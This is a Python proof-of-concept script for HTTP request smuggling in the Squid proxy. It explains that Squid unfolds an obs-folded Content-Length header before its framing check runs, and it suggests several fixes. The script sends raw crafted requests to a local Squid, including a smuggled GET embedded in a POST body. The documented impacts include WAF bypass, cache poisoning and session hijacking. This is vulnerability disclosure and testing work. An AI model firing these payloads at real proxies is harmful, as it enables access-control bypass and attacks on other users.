#!/usr/bin/env python3
"""
Proof-of-Concept: HTTP Request Smuggling via obs-fold Content-Length in Squid

VULNERABILITY
=============
Squid accepts obs-fold (RFC 7230 §3.2.4 line folding) on Content-Length
headers in ALL parser modes, including relaxed_header_parser=off (strict).
It unfolds the continuation line and forwards a normalized Content-Length
header to the backend.

RFC 9110 §5.5 explicitly forbids obs-fold on framing headers:
  "A server MUST NOT apply a request to the target resource until it
   receives the entire request header section, since later header field
   lines might include conditionals, authentication credentials, or
   deliberately misleading duplicate header fields that would impact
   request processing."

RFC 9112 §5.1:
  "If a Transfer-Encoding or Content-Length header field is present
   and obs-fold was used to form its value, the message is malformed."

ROOT CAUSE
==========
In src/http/one/Parser.cc:
  1. headersEnd() detects obs-fold and sets containsObsFold = true
  2. grabMimeBlock() calls unfoldMime() which REPLACES obs-fold with SP
  3. The unfolded header block is passed to HttpHeader::parse()

In src/HttpHeader.cc:590-598:
  4. parse() checks `if (lines > 1 || hasBareCr)` for framing headers
  5. But after unfolding, lines == 1 (obs-fold was merged into one line)
  6. The framing header rejection NEVER FIRES because the obs-fold
     evidence was destroyed by step 2

The defense exists (line 594: "WARNING: obs-fold in framing-sensitive")
but is unreachable code for obs-fold in Content-Length.

ATTACK SCENARIO
===============
Front-end Proxy (CDN, WAF, load balancer) → Squid → Backend

The attack requires a front-end that DOES NOT unfold obs-fold before
forwarding (i.e., treats the folded Content-Length as invalid/absent).
Many proxies and WAFs do this -- obs-fold is rare in the wild and some
implementations don't implement unfolding at all.

Step 1: Attacker sends a request with obs-folded Content-Length through
        a front-end proxy to Squid.

Step 2: Front-end sees no valid Content-Length (obs-fold makes it
        unparseable) → assumes body length = 0.

Step 3: Squid unfolds obs-fold → sees Content-Length: N → reads N bytes
        as the request body.

Step 4: The front-end thinks those N bytes are the START of a new
        request. The attacker controls these N bytes.

Step 5: The front-end processes the "new request" (the smuggled request)
        as if it came from a legitimate client on the same connection.

IMPACT
======
- Bypass security controls (WAF rules, ACLs) by smuggling requests
  past the front-end
- Cache poisoning if the smuggled request modifies cached responses
- Session hijacking if the smuggled request executes in another user's
  connection context (HTTP connection reuse)
- Credential theft if the front-end appends auth headers to the
  smuggled request

DEMO
====
This script demonstrates the vulnerability against a running Squid instance.
It does NOT require a vulnerable front-end -- it directly shows that Squid
accepts the obs-folded Content-Length and forwards a normalized version.

The "smuggled request" is embedded in the body of the first request.
A front-end that ignores obs-fold would see it as a second request.
"""

import base64
import json
import socket
import sys
import textwrap


PROXY_HOST = "127.0.0.1"
PROXY_PORT = 3128
BACKEND = "echo-raw:8888"


def send_raw(payload: bytes, timeout: float = 5.0) -> bytes:
    """Send raw bytes through the proxy and collect the full response."""
    sock = socket.create_connection((PROXY_HOST, PROXY_PORT), timeout=timeout)
    sock.settimeout(timeout)
    sock.sendall(payload)
    chunks = []
    while True:
        try:
            data = sock.recv(65536)
            if not data:
                break
            chunks.append(data)
        except socket.timeout:
            break
    sock.close()
    return b"".join(chunks)


def decode_chunked(data: bytes) -> bytes:
    result = b""
    pos = 0
    while pos < len(data):
        crlf = data.find(b"\r\n", pos)
        if crlf < 0:
            break
        try:
            chunk_size = int(data[pos:crlf].split(b";")[0].strip(), 16)
        except ValueError:
            break
        if chunk_size == 0:
            break
        cs = crlf + 2
        result += data[cs:cs + chunk_size]
        pos = cs + chunk_size + 2
    return result


def get_body(response: bytes) -> bytes:
    hdr_end = response.find(b"\r\n\r\n")
    if hdr_end < 0:
        return b""
    raw_body = response[hdr_end + 4:]
    headers = response[:hdr_end].decode("latin-1")
    if "chunked" in headers.lower():
        return decode_chunked(raw_body)
    return raw_body


def get_status(response: bytes) -> int:
    line = response.split(b"\r\n", 1)[0].decode("latin-1")
    parts = line.split(" ", 2)
    return int(parts[1]) if len(parts) >= 2 else 0


def print_section(title: str):
    print(f"\n{'='*70}")
    print(f"  {title}")
    print(f"{'='*70}\n")


def demo_basic_acceptance():
    """Show that Squid accepts obs-fold on Content-Length."""
    print_section("DEMO 1: Squid accepts obs-folded Content-Length")

    payload = (
        b"POST http://" + BACKEND.encode() + b"/demo1 HTTP/1.1\r\n"
        b"Host: " + BACKEND.encode() + b"\r\n"
        b"Content-Length:\r\n"
        b" 5\r\n"
        b"\r\n"
        b"hello"
    )

    print("Sending request with obs-folded Content-Length:")
    print("  Content-Length:\\r\\n")
    print("   5\\r\\n")
    print("  (continuation line with leading space)")
    print()

    resp = send_raw(payload)
    status = get_status(resp)

    if status == 400:
        print(f"  Result: Squid REJECTED (HTTP {status})")
        print("  [Not vulnerable to this vector]")
        return False

    body = get_body(resp)
    try:
        data = json.loads(body)
        raw = base64.b64decode(data.get("raw_b64", ""))
        print(f"  Result: Squid ACCEPTED and forwarded (HTTP {status})")
        print(f"  Backend received {data.get('raw_len', 0)} bytes:")
        print()
        for line in raw.decode("latin-1").split("\r\n"):
            print(f"    {line}")
        print()

        if b"Content-Length: 5" in raw:
            print("  *** CONFIRMED: Squid unfolded obs-fold and forwarded")
            print("      'Content-Length: 5' as a normal header.")
            return True
    except Exception as e:
        print(f"  Parse error: {e}")
        print(f"  Raw body: {body[:200]}")

    return False


def demo_smuggle_payload():
    """Demonstrate the smuggled request embedded in the body."""
    print_section("DEMO 2: Request smuggling via obs-fold Content-Length")

    smuggled_request = (
        b"GET http://" + BACKEND.encode() + b"/SMUGGLED HTTP/1.1\r\n"
        b"Host: " + BACKEND.encode() + b"\r\n"
        b"X-Smuggled: true\r\n"
        b"\r\n"
    )
    body_len = len(smuggled_request)

    # The attacker's payload: a POST with obs-folded CL, followed by the
    # smuggled request in the "body" region.
    #
    # A front-end that doesn't understand obs-fold sees:
    #   POST /legit HTTP/1.1        ← request 1 (no valid CL → body=0)
    #   GET /SMUGGLED HTTP/1.1      ← request 2 (the smuggled request!)
    #
    # Squid sees:
    #   POST /legit HTTP/1.1        ← request 1 with CL=N
    #   [N bytes of body]           ← consumed as body of request 1
    #
    payload = (
        b"POST http://" + BACKEND.encode() + b"/legit HTTP/1.1\r\n"
        b"Host: " + BACKEND.encode() + b"\r\n"
        b"Content-Length:\r\n"
        b" " + str(body_len).encode() + b"\r\n"
        b"\r\n"
        + smuggled_request
    )

    print("Attack payload (what the attacker sends):")
    print("-" * 50)
    for line in payload.decode("latin-1").replace("\r\n", "\\r\\n\n").split("\n"):
        if line:
            print(f"  {line}")
    print("-" * 50)
    print()

    print("Front-end proxy interpretation (no obs-fold support):")
    print("  Request 1: POST /legit (no valid CL → body=0)")
    print(f"  Request 2: GET /SMUGGLED (the smuggled request, {body_len} bytes)")
    print()
    print("Squid interpretation (unfolds obs-fold):")
    print(f"  Request 1: POST /legit (CL={body_len}, body = smuggled request bytes)")
    print("  [No second request — body was consumed]")
    print()

    resp = send_raw(payload)
    status = get_status(resp)

    if status == 400:
        print(f"  Result: Squid rejected (HTTP {status})")
        return

    body = get_body(resp)
    try:
        data = json.loads(body)
        raw = base64.b64decode(data.get("raw_b64", ""))
        print(f"  Squid forwarded to backend (HTTP {status}):")
        print()
        for line in raw.decode("latin-1").split("\r\n"):
            print(f"    {line}")
        print()

        if b"Content-Length:" in raw:
            cl_line = [l for l in raw.decode("latin-1").split("\r\n")
                       if l.lower().startswith("content-length:")]
            if cl_line:
                print(f"  *** Squid forwarded: {cl_line[0]}")

        # Check if the smuggled request is in the body
        header_end = raw.find(b"\r\n\r\n")
        if header_end >= 0:
            forwarded_body = raw[header_end + 4:]
            if b"SMUGGLED" in forwarded_body:
                print(f"  *** Smuggled request is in the body ({len(forwarded_body)} bytes):")
                print()
                for line in forwarded_body.decode("latin-1").split("\r\n"):
                    print(f"    {line}")
                print()
                print("  The front-end (not Squid) would process this as a separate request.")
    except Exception as e:
        print(f"  Parse error: {e}")

    # Now check if Squid actually processed a second response (it shouldn't,
    # because it consumed the smuggled bytes as body of the first request)
    responses = resp.split(b"HTTP/1.1 ")
    num_responses = len([r for r in responses if r])
    print(f"\n  Squid returned {num_responses} HTTP response(s).")
    if num_responses == 1:
        print("  As expected: Squid consumed the smuggled request as body.")
        print("  A front-end proxy would have seen it as a second request.")


def demo_strict_mode_bypass():
    """Show that strict mode also accepts obs-fold on CL."""
    print_section("DEMO 3: strict mode (relaxed_header_parser off) also vulnerable")

    payload = (
        b"POST http://" + BACKEND.encode() + b"/strict-test HTTP/1.1\r\n"
        b"Host: " + BACKEND.encode() + b"\r\n"
        b"Content-Length:\r\n"
        b" 11\r\n"
        b"\r\n"
        b"strictcheck"
    )

    print("Sending obs-fold CL through strict-mode Squid...")
    print("(Requires squid-strict.conf to be loaded)")
    print()

    resp = send_raw(payload)
    status = get_status(resp)

    if status == 400:
        print(f"  Strict mode REJECTED (HTTP {status}) — expected behavior")
    else:
        body = get_body(resp)
        try:
            data = json.loads(body)
            raw = base64.b64decode(data.get("raw_b64", ""))
            if b"Content-Length: 11" in raw:
                print(f"  *** Strict mode ACCEPTED obs-fold CL (HTTP {status})")
                print("  *** This should NOT happen — strict mode should reject obs-fold")
                print(f"  Backend received: {raw.decode('latin-1')[:200]}")
        except Exception:
            print(f"  HTTP {status}, could not parse backend response")


def demo_te_obs_fold():
    """Show whether obs-fold on Transfer-Encoding is also accepted."""
    print_section("DEMO 4: obs-fold on Transfer-Encoding")

    payload = (
        b"POST http://" + BACKEND.encode() + b"/te-fold HTTP/1.1\r\n"
        b"Host: " + BACKEND.encode() + b"\r\n"
        b"Transfer-Encoding:\r\n"
        b" chunked\r\n"
        b"\r\n"
        b"5\r\nhello\r\n0\r\n\r\n"
    )

    print("Sending obs-fold on Transfer-Encoding...")
    resp = send_raw(payload)
    status = get_status(resp)

    if status == 400:
        print(f"  Squid REJECTED (HTTP {status}) — Transfer-Encoding obs-fold blocked")
    else:
        print(f"  Squid ACCEPTED (HTTP {status}) — Transfer-Encoding obs-fold also bypasses!")


def demo_comparison_bare_cr():
    """Show that bare CR on CL IS correctly rejected in strict mode."""
    print_section("DEMO 5: Comparison — bare CR on CL correctly rejected")

    payload = (
        b"POST http://" + BACKEND.encode() + b"/bare-cr-cl HTTP/1.1\r\n"
        b"Host: " + BACKEND.encode() + b"\r\n"
        b"Content-Length: \r5\r\n"
        b"\r\n"
        b"hello"
    )

    print("Sending bare CR in Content-Length value...")
    resp = send_raw(payload)
    status = get_status(resp)

    if status == 400:
        print(f"  Squid REJECTED (HTTP {status}) — bare CR on CL correctly blocked")
        print("  (The 'hasBareCr' path in HttpHeader.cc:590 works)")
        print("  (But the 'lines > 1' path for obs-fold is bypassed by unfoldMime)")
    else:
        print(f"  Squid ACCEPTED (HTTP {status}) — unexpected!")


def main():
    print("""
╔══════════════════════════════════════════════════════════════════════╗
║  PoC: HTTP Request Smuggling via obs-fold Content-Length in Squid   ║
║                                                                      ║
║  Squid accepts obs-fold on Content-Length in ALL parser modes.       ║
║  RFC 9112 §5.1: message is malformed if obs-fold is used on CL/TE.  ║
╚══════════════════════════════════════════════════════════════════════╝
""")

    print(f"Target: Squid at {PROXY_HOST}:{PROXY_PORT}")
    print(f"Backend: {BACKEND} (raw TCP echo)")
    print()

    # Verify connectivity
    try:
        test = send_raw(
            b"GET http://" + BACKEND.encode() + b"/ping HTTP/1.1\r\n"
            b"Host: " + BACKEND.encode() + b"\r\n\r\n"
        )
        if get_status(test) != 200:
            print("ERROR: Squid not reachable or backend down")
            sys.exit(1)
    except Exception as e:
        print(f"ERROR: Cannot connect to proxy: {e}")
        sys.exit(1)

    print("Connectivity OK.\n")

    confirmed = demo_basic_acceptance()
    if confirmed:
        demo_smuggle_payload()
    demo_te_obs_fold()
    demo_strict_mode_bypass()
    demo_comparison_bare_cr()

    print_section("SUMMARY")
    print(textwrap.dedent("""\
    Root Cause:
      Http::One::Parser::unfoldMime() replaces obs-fold with SP BEFORE
      HttpHeader::parse() checks for obs-fold on framing headers.
      The defense at HttpHeader.cc:590-598 is unreachable for obs-fold.

    Fix Options:
      A. Move unfoldMime() AFTER the framing header check (would require
         HttpHeader::parse to handle unfolded+folded formats).
      B. Pass a flag from grabMimeBlock() to HttpHeader::parse() indicating
         obs-fold was present, and reject ALL framing headers if set.
      C. In unfoldMime(), track which header names had obs-fold and pass
         that to HttpHeader::parse() for per-header rejection.
      D. (Simplest) If containsObsFold is true, scan the raw header block
         for 'Content-Length' or 'Transfer-Encoding' BEFORE unfolding,
         and reject the entire message if found.

    Affected Versions:
      Squid 6.x (tested: 6.13). Likely affects all versions with
      unfoldMime() — introduced to comply with RFC 7230 §3.2.4.

    Affected Configurations:
      ALL values of relaxed_header_parser (on, off, warn).
      The bug is in the HTTP/1 parser layer, not the header parser.
    """))


if __name__ == "__main__":
    main()
